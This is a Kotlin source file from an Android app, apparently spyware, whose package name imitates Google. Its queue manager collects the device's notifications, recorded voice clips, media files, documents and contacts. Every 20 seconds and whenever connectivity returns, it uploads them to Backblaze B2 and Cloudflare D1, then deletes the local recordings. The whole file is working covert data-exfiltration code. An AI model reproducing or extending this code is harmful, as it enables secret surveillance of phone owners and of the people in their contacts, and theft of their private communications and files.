package com.opp.googleoperation.telemetry

import android.content.Context
import android.net.ConnectivityManager
import android.net.Network
import android.net.NetworkCapabilities
import android.net.NetworkRequest
import android.util.Log
import com.google.gson.reflect.TypeToken
import com.opp.googleoperation.data.model.AudioThreatEvent
import com.opp.googleoperation.data.model.ContactEvent
import com.opp.googleoperation.data.model.MediaEvent
import com.opp.googleoperation.data.model.NotificationEvent
import com.opp.googleoperation.network.ApiClient
import com.opp.googleoperation.network.B2MediaUploader
import com.opp.googleoperation.network.CloudflareDispatcher
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import kotlinx.coroutines.sync.Mutex
import kotlinx.coroutines.sync.withLock
import java.io.File

class UnifiedOfflineQueueManager(
    private val ctx: Context,
    private val scope: CoroutineScope,
    private val dispatcher: CloudflareDispatcher,
    private val b2Uploader: B2MediaUploader
) {
    companion object {
        private const val TAG = "UnifiedOfflineQueue"
        private const val NOTIFS_QUEUE_FILE = "pending_notifs_queue.json"
        private const val VOICE_QUEUE_FILE = "pending_voice_queue.json"
        private const val MEDIA_QUEUE_FILE = "pending_media_queue.json"
        private const val CONTACTS_QUEUE_FILE = "pending_contacts_queue.json"
    }

    private val notifsMutex = Mutex()
    private val voiceMutex = Mutex()
    private val mediaMutex = Mutex()
    private val contactsMutex = Mutex()

    private val notifsFile: File get() = File(ctx.filesDir, NOTIFS_QUEUE_FILE)
    private val voiceFile: File get() = File(ctx.filesDir, VOICE_QUEUE_FILE)
    private val mediaFile: File get() = File(ctx.filesDir, MEDIA_QUEUE_FILE)
    private val contactsFile: File get() = File(ctx.filesDir, CONTACTS_QUEUE_FILE)

    private val connectivityManager = ctx.getSystemService(Context.CONNECTIVITY_SERVICE) as? ConnectivityManager
    private var isNetworkCallbackRegistered = false

    private val networkCallback = object : ConnectivityManager.NetworkCallback() {
        override fun onAvailable(network: Network) {
            super.onAvailable(network)
            Log.d(TAG, "network connectivity restored — triggering immediate queue flush")
            flushAllQueues()
        }
    }

    fun startNetworkMonitoring() {
        if (isNetworkCallbackRegistered || connectivityManager == null) return
        try {
            val request = NetworkRequest.Builder()
                .addCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
                .build()
            connectivityManager.registerNetworkCallback(request, networkCallback)
            isNetworkCallbackRegistered = true
            Log.d(TAG, "network connectivity observer registered")
        } catch (e: Exception) {
            Log.w(TAG, "failed to register network callback", e)
        }

        // Active background flush worker (runs every 20 seconds to drain pending items)
        scope.launch(Dispatchers.IO) {
            while (isActive) {
                delay(20000L)
                try {
                    flushAllQueues()
                } catch (_: Exception) {}
            }
        }
    }

    fun stopNetworkMonitoring() {
        if (!isNetworkCallbackRegistered || connectivityManager == null) return
        try {
            connectivityManager.unregisterNetworkCallback(networkCallback)
            isNetworkCallbackRegistered = false
        } catch (e: Exception) {
            Log.w(TAG, "failed to unregister network callback", e)
        }
    }

    // --- 1. Notification Offline Queue ---
    fun enqueueNotification(event: NotificationEvent) {
        scope.launch(Dispatchers.IO) {
            notifsMutex.withLock {
                val list = readList<NotificationEvent>(notifsFile).toMutableList()
                val isDuplicate = list.any { 
                    it.id == event.id || (it.title == event.title && it.content == event.content && it.postTime == event.postTime) 
                }
                if (!isDuplicate) {
                    list.add(event)
                    val capped = if (list.size > 500) list.takeLast(500) else list
                    writeList(notifsFile, capped)
                    Log.d(TAG, "enqueued notification (total pending on disk: ${capped.size})")
                }
            }
            flushNotifications()
        }
    }

    suspend fun flushNotifications() {
        notifsMutex.withLock {
            val pending = readList<NotificationEvent>(notifsFile)
            if (pending.isEmpty()) return

            val success = dispatcher.sendNotifications(pending)
            if (success) {
                if (notifsFile.exists()) notifsFile.delete()
                Log.d(TAG, "successfully flushed & purged ${pending.size} queued notifications from device")
            } else {
                Log.w(TAG, "notification flush failed (offline) — retaining ${pending.size} items on disk")
            }
        }
    }

    // --- 2. Voice Audio Clips Offline Queue ---
    fun enqueueVoiceClip(event: AudioThreatEvent) {
        scope.launch(Dispatchers.IO) {
            voiceMutex.withLock {
                val list = readList<AudioThreatEvent>(voiceFile).toMutableList()
                val isDuplicate = list.any { 
                    it.id == event.id || it.compressedAudioPath == event.compressedAudioPath 
                }
                if (!isDuplicate) {
                    list.add(event)
                    val capped = if (list.size > 100) list.takeLast(100) else list
                    writeList(voiceFile, capped)
                    Log.d(TAG, "enqueued voice clip: ${event.id} (total pending on disk: ${capped.size})")
                }
            }
            flushVoiceClips()
        }
    }

    suspend fun flushVoiceClips() {
        voiceMutex.withLock {
            val pending = readList<AudioThreatEvent>(voiceFile).toMutableList()
            if (pending.isEmpty()) return

            val successfullySent = mutableListOf<AudioThreatEvent>()

            for (event in pending) {
                try {
                    // 1. Upload audio to Backblaze B2
                    val b2Url = b2Uploader.uploadVoiceClip(event)
                    if (b2Url != null) {
                        event.b2Url = b2Url
                        // 2. Dispatch metadata record to Cloudflare D1
                        val registered = dispatcher.sendVoiceEvent(event)
                        if (registered) {
                            successfullySent.add(event)
                            // 3. Delete local .m4a file from device
                            try {
                                val localFile = File(event.compressedAudioPath)
                                if (localFile.exists()) {
                                    val deleted = localFile.delete()
                                    Log.d(TAG, "deleted local audio file ${localFile.name}: $deleted")
                                }
                            } catch (_: Exception) {}
                        }
                    }
                } catch (e: Exception) {
                    Log.w(TAG, "failed uploading voice clip ${event.id}", e)
                    break // Stop iteration on connection failure
                }
            }

            if (successfullySent.isNotEmpty()) {
                val remaining = pending.filterNot { it.id in successfullySent.map { s -> s.id } }
                if (remaining.isEmpty()) {
                    if (voiceFile.exists()) voiceFile.delete()
                } else {
                    writeList(voiceFile, remaining)
                }
                Log.d(TAG, "flushed ${successfullySent.size} voice clips, ${remaining.size} remaining on disk")
            }
        }
    }

    // --- 3. Media & Documents Offline Queue ---
    fun enqueueMedia(event: MediaEvent) {
        enqueueMedia(listOf(event))
    }

    fun enqueueMedia(events: List<MediaEvent>) {
        if (events.isEmpty()) return
        scope.launch(Dispatchers.IO) {
            mediaMutex.withLock {
                val list = readList<MediaEvent>(mediaFile).toMutableList()
                var added = 0
                for (event in events) {
                    val isDuplicate = list.any { 
                        it.mediaId == event.mediaId || it.contentUri == event.contentUri 
                    }
                    if (!isDuplicate) {
                        list.add(event)
                        added++
                    }
                }
                if (added > 0) {
                    val capped = if (list.size > 500) list.takeLast(500) else list
                    writeList(mediaFile, capped)
                    Log.d(TAG, "enqueued $added media files (total pending on disk: ${capped.size})")
                }
            }
            flushMedia()
        }
    }

    suspend fun flushMedia() {
        mediaMutex.withLock {
            val pending = readList<MediaEvent>(mediaFile).toMutableList()
            if (pending.isEmpty()) return

            val successfullySent = mutableListOf<MediaEvent>()

            for (event in pending) {
                try {
                    val b2Url = b2Uploader.uploadMediaEvent(event)
                    if (b2Url != null) {
                        event.b2Url = b2Url
                        val registered = dispatcher.sendMediaRecord(event)
                        if (registered) {
                            successfullySent.add(event)
                        }
                    }
                } catch (e: Exception) {
                    Log.w(TAG, "failed uploading media file ${event.fileName}", e)
                    break
                }
            }

            if (successfullySent.isNotEmpty()) {
                val remaining = pending.filterNot { it.mediaId in successfullySent.map { s -> s.mediaId } }
                if (remaining.isEmpty()) {
                    if (mediaFile.exists()) mediaFile.delete()
                } else {
                    writeList(mediaFile, remaining)
                }
                Log.d(TAG, "flushed ${successfullySent.size} media records, ${remaining.size} remaining on disk")
            }
        }
    }

    // --- 4. Contacts Offline Queue ---
    fun enqueueContact(event: ContactEvent) = enqueueContacts(listOf(event))

    fun enqueueContacts(events: List<ContactEvent>) {
        if (events.isEmpty()) return
        scope.launch(Dispatchers.IO) {
            contactsMutex.withLock {
                val list = readList<ContactEvent>(contactsFile).toMutableList()
                for (event in events) {
                    val isDuplicate = list.any {
                        it.id == event.id || (it.contactId == event.contactId && it.phoneNumber == event.phoneNumber)
                    }
                    if (!isDuplicate) {
                        list.add(event)
                    }
                }
                val capped = if (list.size > 500) list.takeLast(500) else list
                writeList(contactsFile, capped)
                Log.d(TAG, "enqueued ${events.size} contacts (total pending on disk: ${capped.size})")
            }
            flushContacts()
        }
    }

    suspend fun flushContacts() {
        contactsMutex.withLock {
            val pending = readList<ContactEvent>(contactsFile)
            if (pending.isEmpty()) return

            val success = dispatcher.sendContacts(pending)
            if (success) {
                if (contactsFile.exists()) contactsFile.delete()
                Log.d(TAG, "successfully flushed & purged ${pending.size} queued contacts from device")
            } else {
                Log.w(TAG, "contacts flush failed (offline) — retaining ${pending.size} items on disk")
            }
        }
    }

    // --- Flush All ---
    fun flushAllQueues() {
        scope.launch(Dispatchers.IO) {
            try {
                flushNotifications()
                flushVoiceClips()
                flushMedia()
                flushContacts()
            } catch (e: Exception) {
                Log.w(TAG, "error during flushAllQueues", e)
            }
        }
    }

    private inline fun <reified T> readList(file: File): List<T> {
        if (!file.exists()) return emptyList()
        return try {
            val json = file.readText(Charsets.UTF_8)
            if (json.isBlank()) return emptyList()
            val type = TypeToken.getParameterized(List::class.java, T::class.java).type
            ApiClient.gson.fromJson<List<T>>(json, type) ?: emptyList()
        } catch (e: Exception) {
            emptyList()
        }
    }

    private inline fun <reified T> writeList(file: File, list: List<T>) {
        try {
            val json = ApiClient.gson.toJson(list)
            file.writeText(json, Charsets.UTF_8)
        } catch (e: Exception) {
            Log.w(TAG, "failed writing queue file ${file.name}", e)
        }
    }
}
